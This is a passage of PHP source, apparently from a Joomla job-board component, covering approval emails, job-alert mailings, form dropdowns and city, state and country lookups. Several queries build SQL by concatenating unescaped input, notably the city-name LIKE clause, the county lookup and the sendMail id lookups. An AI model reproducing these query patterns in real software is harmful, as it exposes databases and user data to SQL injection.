            $msgBody = str_replace('{JOB_CATEGORY}', $JobCategory, $msgBody);
            $msgBody = str_replace('{JOB_TITLE}', $JobTitle, $msgBody);
            $msgBody = str_replace('{JOB_STATUS}', $JobStatus, $msgBody);

            $config = $this->getConfigByFor('default');
            if ($config['visitor_can_edit_job'] == 1) {
                $path = JURI::base();
                $path .= 'index.php?option=com_jsjobs&view=employer&layout=formjob_visitor&email=' . $jobuser->contactemail . '&jobid=' . $jobuser->jobid;
                $text = '<br><a href="' . $path . '" target="_blank" >' . JText::_('JS_CLICK_HERE_TO_EDIT_JOB') . '</a>';
                $msgBody .= $text;
            }

            $emailconfig = $this->getConfigByFor('email');
            $senderName = $emailconfig['mailfromname'];
            $senderEmail = $emailconfig['mailfromaddress'];

            $message = & JFactory::getMailer();
            $message->addRecipient($EmployerEmail); //to email

            $message->setSubject($msgSubject);
            $siteAddress = JURI::base();
            $message->setBody($msgBody);
            $sender = array($senderEmail, $senderName);
            $message->setSender($sender);
            $message->IsHTML(true);
            $sent = $message->send();
            return $sent;
        }
    }

    function &sendMail($for, $action, $id) {
        //action			1 = job approved, 2 = job reject 6, resume approved, 7 resume reject
        $db = & JFactory::getDBO();
        $siteAddress = JURI::root();

        if ($for == 1) { //company
            if ($action == 1) { // company approved
                $templatefor = 'company-approval';
            } elseif ($action == -1) { //company reject
                $templatefor = 'company-rejecting';
            }
        } elseif ($for == 2) { //job
            if ($action == 1) { // job approved
                $templatefor = 'job-approval';
            } elseif ($action == -1) { // job reject
                $templatefor = 'job-rejecting';
            }
        } elseif ($for == 3) { // resume
            if ($action == 1) { //resume approved
                $templatefor = 'resume-approval';
            } elseif ($action == -1) { // resume reject
                $templatefor = 'resume-rejecting';
            }
        } elseif ($for == 4) {// visitor job
            if ($action == 1) { //resume approved
                $templatefor = 'job-alert-visitor';
            } elseif ($action == -1) { // resume reject
                $templatefor = 'job-alert-visitor';
            }
        }

        $query = "SELECT template.* FROM `#__js_job_emailtemplates` AS template	WHERE template.templatefor = " . $db->Quote($templatefor);
        $db->setQuery($query);
        $template = $db->loadObject();
        $msgSubject = $template->subject;
        $msgBody = $template->body;

        if ($for == 1) { //company
            $query = "SELECT company.name, company.contactname, company.contactemail FROM `#__js_job_companies` AS company
				WHERE company.id = " . $id;

            $db->setQuery($query);
            $company = $db->loadObject();

            $Name = $company->contactname;
            $Email = $company->contactemail;
            $companyName = $company->name;

            $msgSubject = str_replace('{COMPANY_NAME}', $companyName, $msgSubject);
            $msgSubject = str_replace('{EMPLOYER_NAME}', $Name, $msgSubject);
            $msgBody = str_replace('{COMPANY_NAME}', $companyName, $msgBody);
            $msgBody = str_replace('{EMPLOYER_NAME}', $Name, $msgBody);
        } elseif ($for == 2) { //job
            $query = "SELECT job.title, company.contactname, company.contactemail 
						FROM `#__js_job_jobs` AS job
						JOIN `#__js_job_companies` AS company ON job.companyid = company.id
				WHERE job.id = " . $id;
            $db->setQuery($query);
            $job = $db->loadObject();

            $Name = $job->contactname;
            $Email = $job->contactemail;
            $jobTitle = $job->title;
            $msgSubject = str_replace('{JOB_TITLE}', $jobTitle, $msgSubject);
            $msgSubject = str_replace('{EMPLOYER_NAME}', $Name, $msgSubject);
            $msgBody = str_replace('{JOB_TITLE}', $jobTitle, $msgBody);
            $msgBody = str_replace('{EMPLOYER_NAME}', $Name, $msgBody);
        } elseif ($for == 3) { // resume
            $query = "SELECT app.application_title, app.first_name, app.middle_name, app.last_name, app.email_address FROM `#__js_job_resume` AS app
				WHERE app.id = " . $id;

            $db->setQuery($query);
            $app = $db->loadObject();

            $Name = $app->first_name;
            if ($app->middle_name)
                $Name .= " " . $app->middle_name;
            if ($app->last_name)
                $Name .= " " . $app->last_name;
            $Email = $app->email_address;
            $resumeTitle = $app->application_title;
            $msgSubject = str_replace('{RESUME_TITLE}', $resumeTitle, $msgSubject);
            $msgSubject = str_replace('{JOBSEEKER_NAME}', $Name, $msgSubject);
            $msgBody = str_replace('{RESUME_TITLE}', $resumeTitle, $msgBody);
            $msgBody = str_replace('{JOBSEEKER_NAME}', $Name, $msgBody);
        }elseif ($for == 4) {
            $jobquery = "SELECT job.title, job.jobstatus,job.jobid AS jobid, company.name AS companyname, cat.cat_title AS cattitle,job.sendemail,company.contactemail,company.contactname
                                      FROM `#__js_job_jobs` AS job
                                      JOIN `#__js_job_companies` AS company ON company.id = job.companyid
                                      JOIN `#__js_job_categories` AS cat ON cat.id = job.jobcategory
                                      WHERE job.id = " . $id;
            $db->setQuery($jobquery);
            $jobuser = $db->loadObject();

            $CompanyName = $jobuser->companyname;
            $JobCategory = $jobuser->cattitle;
            $JobTitle = $jobuser->title;
            if ($jobuser->jobstatus == 1)
                $JobStatus = JText::_('JS_APPROVED');
            else
                $JobStatus = JText::_('JS_WAITING_FOR_APPROVEL');
            $Email = $jobuser->contactemail;
            $ContactName = $jobuser->contactname;


            $msgSubject = str_replace('{COMPANY_NAME}', $CompanyName, $msgSubject);
            $msgSubject = str_replace('{CONTACT_NAME}', $ContactName, $msgSubject);
            $msgSubject = str_replace('{JOB_CATEGORY}', $JobCategory, $msgSubject);
            $msgSubject = str_replace('{JOB_TITLE}', $JobTitle, $msgSubject);
            $msgSubject = str_replace('{JOB_STATUS}', $JobStatus, $msgSubject);
            $msgBody = str_replace('{COMPANY_NAME}', $CompanyName, $msgBody);
            $msgBody = str_replace('{CONTACT_NAME}', $ContactName, $msgBody);
            $msgBody = str_replace('{JOB_CATEGORY}', $JobCategory, $msgBody);
            $msgBody = str_replace('{JOB_TITLE}', $JobTitle, $msgBody);
            $msgBody = str_replace('{JOB_STATUS}', $JobStatus, $msgBody);

            $config = $this->getConfigByFor('default');
            if ($config['visitor_can_edit_job'] == 1) {
                $path = JURI::base();
                $path .= 'index.php?option=com_jsjobs&view=employer&layout=formjob_visitor&email=' . $jobuser->contactemail . '&jobid=' . $jobuser->jobid;
                $text = '<br><a href="' . $path . '" target="_blank" >' . JText::_('JS_CLICK_HERE_TO_EDIT_JOB') . '</a>';
                $msgBody .= $text;
            }
        }


        if (!$this->_config)
            $this->getConfig();
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'mailfromname')
                $senderName = $conf->configvalue;
            if ($conf->configname == 'mailfromaddress')
                $senderEmail = $conf->configvalue;
        }

        $message = & JFactory::getMailer();
        $message->addRecipient($Email); //to email

        $message->setSubject($msgSubject);
        $message->setBody($msgBody);
        $sender = array($senderEmail, $senderName);
        $message->setSender($sender);
        $message->IsHTML(true);
        $sent = $message->send();


        return true;
    }

    function sendJobAlertJobseeker($jobid) {
        $db = &$this->getDBO();
        if ((is_numeric($jobid) == false) || ($jobid == 0) || ($jobid == ''))
            return false;
        $query = "SELECT job.title,job.jobcategory, category.cat_title AS categorytitle, subcategory.title AS subcategorytitle
                            ,subcategory.id AS subcategoryid, job.country, job.state, job.county, job.city
                            , country.name as countryname, state.name as statename, city.name as cityname

                        FROM `#__js_job_jobs` AS job
                        JOIN `#__js_job_categories` AS category ON job.jobcategory  = category.id
                        LEFT JOIN `#__js_job_subcategories` AS subcategory ON job.subcategoryid = subcategory.categoryid
                         JOIN `#__js_job_countries` AS country ON job.country = country.id
                        LEFT JOIN `#__js_job_states` AS state ON job.state = state.id
                        LEFT JOIN `#__js_job_cities` AS city ON job.city = city.id
                        WHERE job.id = " . $jobid;
        $db->setQuery($query);
        $job = $db->loadObject();
        $countryquery = "(SELECT jobalert.contactemail
                            FROM `#__js_job_jobalertsetting` AS jobalert
                            WHERE jobalert.categoryid = " . $job->jobcategory . " 
							AND jobalert.country = " . $job->country;
        if ($job->subcategoryid)
            $countryquery .= " AND jobalert.subcategoryid = " . $job->subcategoryid;
        if ($job->state)
            $countryquery .= " AND jobalert.state != " . $job->state;
        if ($job->city)
            $countryquery .= " AND jobalert.city != " . $job->city;
        $countryquery .= ")";
        $query = $countryquery;
        if ($job->state) {
            $statequery = "(SELECT jobalert.contactemail
                                FROM `#__js_job_jobalertsetting` AS jobalert
                                WHERE jobalert.categoryid = " . $job->jobcategory . " 
								AND jobalert.country = " . $job->country;
            if ($job->subcategoryid)
                $statequery .= " AND jobalert.subcategoryid = " . $job->subcategoryid;
            if ($job->state)
                $statequery .= " AND jobalert.state = " . $job->state;
            if ($job->city)
                $statequery .= " AND jobalert.city != " . $job->city;
            $statequery .= ")";
            $query .= " UNION " . $statequery;
        }
        if ($job->city) {
            $cityquery = "(SELECT jobalert.contactemail
                                FROM `#__js_job_jobalertsetting` AS jobalert
                                WHERE jobalert.categoryid = " . $job->jobcategory . " 
								AND jobalert.country = " . $job->country;
            if ($job->subcategoryid)
                $cityquery .= " AND jobalert.subcategoryid = " . $job->subcategoryid;
            if ($job->state)
                $cityquery .= " AND jobalert.state = " . $job->state;
            if ($job->city)
                $cityquery .= " AND jobalert.city = " . $job->city;
            $cityquery .= ")";
            $query .= " UNION " . $cityquery;
        }
        $db->setQuery($query);
        $result = $db->loadObjectList();

        if (isset($result)) {
            foreach ($result AS $email) {
                $bcc[] = $email->contactemail;
            }
        }
        else
            exit;

        $comma = '';
        if ($job->cityname) {
            $location = $comma . $job->cityname;
            $comma = ', ';
        } elseif ($job->city) {
            $location = $comma . $job->city;
            $comma = ', ';
        }
        if ($job->countyname) {
            $location = $comma . $job->countyname;
            $comma = ', ';
        } elseif ($job->county) {
            $location = $comma . $job->county;
            $comma = ', ';
        }
        if ($job->statename) {
            $location = $comma . $job->statename;
            $comma = ', ';
        } elseif ($job->state) {
            $location = $comma . $job->state;
            $comma = ', ';
        }
        $location .= $comma . $job->countryname;
        $msgSubject = 'New Job';
        $query = "SELECT template.* FROM `#__js_job_emailtemplates` AS template	WHERE template.templatefor = 'job-alert'";
        $db->setQuery($query);
        $template = $db->loadObject();
        $msgSubject = $template->subject;
        $msgBody = $template->body;

        $msgBody = str_replace('{JOB_TITLE}', $job->title, $msgBody);
        $msgBody = str_replace('{CATEGORY}', $job->categorytitle, $msgBody);
        $msgBody = str_replace('{SUB_CATEGORY}', $job->subcategorytitle, $msgBody);
        $msgBody = str_replace('{LOCATION}', $location, $msgBody);

        $config = $this->getConfigByFor('email');

        $message = & JFactory::getMailer();
        $message->addRecipient($config['mailfromaddress']); //to email

        $message->addBCC($bcc);

        $message->setSubject($msgSubject);
        $message->setBody($msgBody);
        $sender = array($config['mailfromaddress'], $config['mailfromname']);
        $message->setSender($sender);

        $message->IsHTML(true);
        $sent = $message->send();
        return $result;
    }

    function &getEmpOptions() {
        if (!$this->_empoptions) {
            $this->_empoptions = array();

            $gender = array(
                '0' => array('value' => 1, 'text' => JText::_('JS_MALE')),
                '1' => array('value' => 2, 'text' => JText::_('JS_FEMALE')),);

            $status = array(
                '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
                '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
                '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);

            $job_type = $this->getJobType('');
            $heighesteducation = $this->getHeighestEducation('');
            $job_categories = $this->getCategories('', '');
            $job_salaryrange = $this->getJobSalaryRange('', '');
            $countries = $this->getCountries('');
            if (isset($this->_application)) {
                $job_subcategories = $this->getSubCategoriesforCombo($this->_application->job_category, '', $this->_application->job_subcategory);
            } else {
                $job_subcategories = $this->getSubCategoriesforCombo($job_categories[0]['value'], '', '');
            }

            if (isset($this->_application)) {
                $this->_empoptions['nationality'] = JHTML::_('select.genericList', $countries, 'nationality', 'class="inputbox" ' . '', 'value', 'text', $this->_application->nationality);
                $this->_empoptions['gender'] = JHTML::_('select.genericList', $gender, 'gender', 'class="inputbox" ' . '', 'value', 'text', $this->_application->gender);

                $this->_empoptions['job_category'] = JHTML::_('select.genericList', $job_categories, 'job_category', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', $this->_application->job_category);
                $this->_empoptions['job_subcategory'] = JHTML::_('select.genericList', $job_subcategories, 'job_subcategory', 'class="inputbox" ' . '', 'value', 'text', $this->_application->job_subcategory);

                $this->_empoptions['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobtype);
                $this->_empoptions['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', $this->_application->heighestfinisheducation);
                $this->_empoptions['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobsalaryrange);
                $this->_empoptions['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $this->_application->status);
                $this->_empoptions['currencyid'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox required" ' . '', 'value', 'text', $this->_application->currencyid);
                $address_city = ($this->_application->address_city == "" OR $this->_application->address_city == 0 ) ? -1 : $this->_application->address_city;
                $this->_empoptions['address_city'] = $this->getAddressDataByCityName('', $address_city);
                $address1_city = ($this->_application->address1_city == "" OR $this->_application->address1_city == 0 ) ? -1 : $this->_application->address1_city;
                $this->_empoptions['address1_city'] = $this->getAddressDataByCityName('', $address1_city);
                $address2_city = ($this->_application->address2_city == "" OR $this->_application->address2_city == 0 ) ? -1 : $this->_application->address2_city;
                $this->_empoptions['address2_city'] = $this->getAddressDataByCityName('', $address2_city);
                $institute_city = ($this->_application->institute_city == "" OR $this->_application->institute_city == 0 ) ? -1 : $this->_application->institute_city;
                $this->_empoptions['institute_city'] = $this->getAddressDataByCityName('', $institute_city);
                $institute1_city = ($this->_application->institute1_city == "" OR $this->_application->institute1_city == 0 ) ? -1 : $this->_application->institute1_city;
                $this->_empoptions['institute1_city'] = $this->getAddressDataByCityName('', $institute1_city);
                $institute2_city = ($this->_application->institute2_city == "" OR $this->_application->institute2_city == 0 ) ? -1 : $this->_application->institute2_city;
                $this->_empoptions['institute2_city'] = $this->getAddressDataByCityName('', $institute2_city);
                $institute3_city = ($this->_application->institute3_city == "" OR $this->_application->institute3_city == 0 ) ? -1 : $this->_application->institute3_city;
                $this->_empoptions['institute3_city'] = $this->getAddressDataByCityName('', $institute3_city);
                $employer_city = ($this->_application->employer_city == "" OR $this->_application->employer_city == 0 ) ? -1 : $this->_application->employer_city;
                $this->_empoptions['employer_city'] = $this->getAddressDataByCityName('', $employer_city);
                $employer1_city = ($this->_application->employer1_city == "" OR $this->_application->employer1_city == 0 ) ? -1 : $this->_application->employer1_city;
                $this->_empoptions['employer1_city'] = $this->getAddressDataByCityName('', $employer1_city);
                $employer2_city = ($this->_application->employer2_city == "" OR $this->_application->employer2_city == 0 ) ? -1 : $this->_application->employer2_city;
                $this->_empoptions['employer2_city'] = $this->getAddressDataByCityName('', $employer2_city);
                $employer3_city = ($this->_application->employer3_city == "" OR $this->_application->employer3_city == 0 ) ? -1 : $this->_application->employer3_city;
                $this->_empoptions['employer3_city'] = $this->getAddressDataByCityName('', $employer3_city);
                $reference_city = ($this->_application->reference_city == "" OR $this->_application->reference_city == 0 ) ? -1 : $this->_application->reference_city;
                $this->_empoptions['reference_city'] = $this->getAddressDataByCityName('', $reference_city);
                $reference1_city = ($this->_application->reference1_city == "" OR $this->_application->reference1_city == 0 ) ? -1 : $this->_application->reference1_city;
                $this->_empoptions['reference1_city'] = $this->getAddressDataByCityName('', $reference1_city);
                $reference2_city = ($this->_application->reference2_city == "" OR $this->_application->reference2_city == 0 ) ? -1 : $this->_application->reference2_city;
                $this->_empoptions['reference2_city'] = $this->getAddressDataByCityName('', $reference2_city);
                $reference3_city = ($this->_application->reference3_city == "" OR $this->_application->reference3_city == 0 ) ? -1 : $this->_application->reference3_city;
                $this->_empoptions['reference3_city'] = $this->getAddressDataByCityName('', $reference3_city);
            } else {
                $this->_empoptions['nationality'] = JHTML::_('select.genericList', $countries, 'nationality', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_empoptions['gender'] = JHTML::_('select.genericList', $gender, 'gender', 'class="inputbox" ' . '', 'value', 'text', '');

                $this->_empoptions['job_category'] = JHTML::_('select.genericList', $job_categories, 'job_category', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
                $this->_empoptions['job_subcategory'] = JHTML::_('select.genericList', $job_subcategories, 'job_subcategory', 'class="inputbox" ' . '', 'value', 'text', '');


                $this->_empoptions['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_empoptions['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_empoptions['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_empoptions['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
                $this->_empoptions['currencyid'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox required" ' . '', 'value', 'text', '');
            }
        }
        return $this->_empoptions;
    }

    function getAddressDataByCityName($cityname, $id = 0) {
        $db = JFactory::getDbo();
        $config = $this->getConfigByFor('default');
        $query = "SELECT concat(city.name";
        switch ($config['defaultaddressdisplaytype']) {
            case 'csc'://City, State, Country
                $query .= " ,', ', (IF(state.name is not null,state.name,'')),IF(state.name is not null,', ',''),country.name)";
                break;
            case 'cs'://City, State
                $query .= " ,', ', (IF(state.name is not null,state.name,'')))";
                break;
            case 'cc'://City, Country
                $query .= " ,', ', country.name)";
                break;
            case 'c'://city by default select for each case
                $query .= ")";
                break;
        }

        $query .= " AS name, city.id AS id
                          FROM `#__js_job_cities` AS city  
                          JOIN `#__js_job_countries` AS country on city.countryid=country.id
                          LEFT JOIN `#__js_job_states` AS state on city.stateid=state.id";
        if ($id == 0)
            $query .= " WHERE city.name LIKE '" . $cityname . "%' AND country.enabled = 1 AND city.enabled = 1 LIMIT 10";
        else
            $query .= " WHERE city.id = $id AND country.enabled = 1 AND city.enabled = 1";
        $db->setQuery($query);

        $result = $db->loadObjectList();
        if (empty($result))
            return null;
        else
            return $result;
    }

    // load the options for our templates
    function &getOptions() {
        if (!$this->_options) {
            $this->_options = array();
            $job_type = array(
                '0' => array('value' => JText::_(1),
                    'text' => JText::_('JS_JOBTYPE_FULLTIME')),
                '1' => array('value' => JText::_(2),
                    'text' => JText::_('JS_JOBTYPE_PARTTIME')),
                '3' => array('value' => JText::_(3),
                    'text' => JText::_('JS_JOBTYPE_INTERNSHIP')),);


            $heighesteducation = array(
                '0' => array('value' => JText::_(1),
                    'text' => JText::_('JS_JOBEDUCATION_UNIVERSITY')),
                '1' => array('value' => JText::_(2),
                    'text' => JText::_('JS_JOBEDUCATION_COLLEGE')),
                '2' => array('value' => JText::_(2),
                    'text' => JText::_('JS_JOBEDUCATION_HIGH_SCHOOL')),
                '3' => array('value' => JText::_(3),
                    'text' => JText::_('JS_JOBEDUCATION_NO_SCHOOL')),);

            $jobstatus = array(
                '0' => array('value' => JText::_(1),
                    'text' => JText::_('JS_JOBSTATUS_SOURCING')),
                '1' => array('value' => JText::_(2),
                    'text' => JText::_('JS_JOBSTATUS_INTERVIEWING')),
                '2' => array('value' => JText::_(3),
                    'text' => JText::_('JS_JOBSTATUS_CLOSED')),
                '3' => array('value' => JText::_(4),
                    'text' => JText::_('JS_JOBSTATUS_FINALISTS')),
                '4' => array('value' => JText::_(5),
                    'text' => JText::_('JS_JOBSTATUS_PENDING')),
                '5' => array('value' => JText::_(6),
                    'text' => JText::_('JS_JOBSTATUS_HOLD')),);


            $job_categories = $this->getCategories('', '');
            $job_salaryrange = $this->getJobSalaryRange('', '');
            $countries = $this->getCountries('');
            if (isset($this->_application))
                $states = $this->getStates($this->_application->country);
            if (isset($this->_application))
                $counties = $this->getCounties($this->_application->state);
            if (isset($this->_application))
                $cities = $this->getCities($this->_application->county);
            if (isset($this->_application)) {
                $this->_options['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'jobcategory', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobcategory);
                $this->_options['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobsalaryrange);
                $this->_options['country'] = JHTML::_('select.genericList', $countries, 'country', 'class="inputbox" ' . 'onChange="dochange(\'state\', this.value)"', 'value', 'text', $this->_application->country);
                if (isset($states[1]))
                    if ($states[1] != '')
                        $this->_options['state'] = JHTML::_('select.genericList', $states, 'state', 'class="inputbox" ' . 'onChange="dochange(\'county\', this.value)"', 'value', 'text', $this->_application->state);
                if (isset($counties[1]))
                    if ($counties[1] != '')
                        $this->_options['county'] = JHTML::_('select.genericList', $counties, 'county', 'class="inputbox" ' . 'onChange="dochange(\'city\', this.value)"', 'value', 'text', $this->_application->county);
                if (isset($cities[1]))
                    if ($cities[1] != '')
                        $this->_options['city'] = JHTML::_('select.genericList', $cities, 'city', 'class="inputbox" ' . '', 'value', 'text', $this->_application->city);
                $this->_options['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'jobstatus', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobstatus);
                $this->_options['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', $this->_application->jobtype);
                $this->_options['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', $this->_application->heighestfinisheducation);
            }else {
                $this->_options['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'jobcategory', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_options['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_options['country'] = JHTML::_('select.genericList', $countries, 'country', 'class="inputbox" ' . 'onChange="dochange(\'state\', this.value)"', 'value', 'text', '');
                if (isset($states[1]))
                    if ($states[1] != '')
                        $this->_options['state'] = JHTML::_('select.genericList', $states, 'state', 'class="inputbox" ' . 'onChange="dochange(\'county\', this.value)"', 'value', 'text', '');
                if (isset($counties[1]))
                    if ($counties[1] != '')
                        $this->_options['county'] = JHTML::_('select.genericList', $counties, 'county', 'class="inputbox" ' . 'onChange="dochange(\'city\', this.value)"', 'value', 'text', '');
                if (isset($cities[1]))
                    if ($cities[1] != '')
                        $this->_options['city'] = JHTML::_('select.genericList', $cities, 'city', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_options['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'jobstatus', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_options['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
                $this->_options['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', '');
            }
        }
        return $this->_options;
    }

    function getCategories($title, $value = "") {
        $db = & JFactory::getDBO();

        $query = "SELECT id, cat_title FROM `#__js_job_categories` WHERE isactive = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY cat_title ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $jobcategories = array();
        if ($title)
            $jobcategories[] = array('value' => JText::_($value), 'text' => JText::_($title));
        foreach ($rows as $row) {
            $jobcategories[] = array('value' => JText::_($row->id),
                'text' => JText::_($row->cat_title));
        }
        return $jobcategories;
    }

    function getSubCategoriesforCombo($categoryid, $title, $value) {
        if(!is_numeric($categoryid)) return false;
        $db = & JFactory::getDBO();

        $query = "SELECT id, title FROM `#__js_job_subcategories` WHERE status = 1 AND categoryid = " . $categoryid;
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY title ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $subcategories = array();
        if ($title)
            $subcategories[] = array('value' => JText::_($value), 'text' => JText::_($title));
        foreach ($rows as $row) {
            $subcategories[] = array('value' => $row->id, 'text' => JText::_($row->title));
        }
        return $subcategories;
    }

    function getSalaryRange($title) {
        $db = & JFactory::getDBO();
        if (!$this->_jobsalaryrange) {
            $query = "SELECT * FROM `#__js_job_salaryrange` ORDER BY 'id' ";
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }
            $this->_jobsalaryrange = $rows;
        }

        if (!$this->_config)
            $this->getConfig('');
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'currency')
                $currency = $conf->configvalue;
        }

        $jobsalaryrange = array();
        if ($title)
            $jobsalaryrange[] = array('value' => JText::_(''), 'text' => $title);

        foreach ($this->_jobsalaryrange as $row) {
            $salrange = $row->rangestart . ' - ' . $row->rangeend;
            $salrange = $row->rangestart; //.' - '.$currency . $row->rangeend;


            $jobsalaryrange[] = array('value' => $row->id, 'text' => $salrange);
        }
        return $jobsalaryrange;
    }

    function getCurrencyResumeApplied($title) {
        $db = & JFactory :: getDBO();
        $q = "SELECT * FROM `#__js_job_currencies` WHERE status = 1";
        if ($this->_client_auth_key != "")
            $q.=" AND serverid!='' AND serverid!=0";
        $db->setQuery($q);
        $allcurrency = $db->loadObjectList();
        $combobox = array();
        if ($title)
            $combobox[] = array('value' => JText::_(''), 'text' => $title);
        if (!empty($allcurrency)) {
            foreach ($allcurrency as $currency) {
                $combobox[] = array('value' => $currency->id, 'text' => JText::_($currency->symbol));
            }
        }
        return $combobox;
    }

    function getJobSalaryRange($title, $value) {
        $db = & JFactory::getDBO();
        $query = "SELECT * FROM `#__js_job_salaryrange`";
        if ($this->_client_auth_key != "")
            $query.=" WHERE serverid!='' AND serverid!=0";
        $query.= " ORDER BY 'id' ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        if (!$this->_config)
            $this->getConfig();
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'currency')
                $currency = $conf->configvalue;
        }
        $jobsalaryrange = array();
        if ($title)
            $jobsalaryrange[] = array('value' => JText::_($value), 'text' => JText::_($title));
        foreach ($rows as $row) {
            $salrange = $row->rangestart . ' - ' . $row->rangeend;
            $jobsalaryrange[] = array('value' => JText::_($row->id),
                'text' => JText::_($salrange));
        }
        return $jobsalaryrange;
    }

    function getCountries($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT * FROM `#__js_job_countries` WHERE enabled = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $countries = array();
        if ($title)
            $countries[] = array('value' => JText::_(''), 'text' => $title);
        else
            $countries[] = array('value' => JText::_(''), 'text' => JText::_('==== choose country ===='));
        foreach ($rows as $row) {
            $countries[] = array('value' => $row->id,
                'text' => JText::_($row->name));
        }
        return $countries;
    }

    function getStates($country) {
        $states = array();
        $db = & JFactory::getDBO();
        if (is_null($country) OR empty($country))
            $country = 0;
        $query = "SELECT * FROM `#__js_job_states` WHERE enabled = 'Y' AND countryid = " . $country;
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }

        foreach ($rows as $row) {
            $states[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }
        return $states;
    }

    function getCounties($state) {
        $counties = array();
        $db = & JFactory::getDBO();
        $query = "SELECT * FROM `#__js_job_counties` WHERE enabled = 'Y' AND statecode = '" . $state . "'";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }

        foreach ($rows as $row) {
            $counties[] = array('value' => JText::_($row->code), 'text' => JText::_($row->name));
        }

        return $counties;
    }

    function getCities($stateid) {
        $cities = array();
        $db = & JFactory::getDBO();
        if (is_null($stateid) OR empty($stateid))
            $stateid = 0;
        $query = "SELECT * FROM `#__js_job_cities` WHERE enabled = 'Y' AND stateid = " . $stateid . " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }

        foreach ($rows as $row) {
            $cities[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }

        return $cities;
    }

    function getCompanies($uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        $db = & JFactory::getDBO();
        $query = "SELECT id, name FROM `#__js_job_companies` WHERE status = 1 ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $companies = array();
        if (!empty($rows)) {
            foreach ($rows as $row) {
                $companies[] = array('value' => $row->id, 'text' => $row->name);
            }
        } else {
            $companies[] = array('value' => '', 'text' => '');
        }
        return $companies;
    }

    function getCompaniesbyJobId($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "SELECT company.id, company.name
                FROM `#__js_job_companies` AS company
                JOIN `#__js_job_jobs` AS job ON company.uid = job.uid
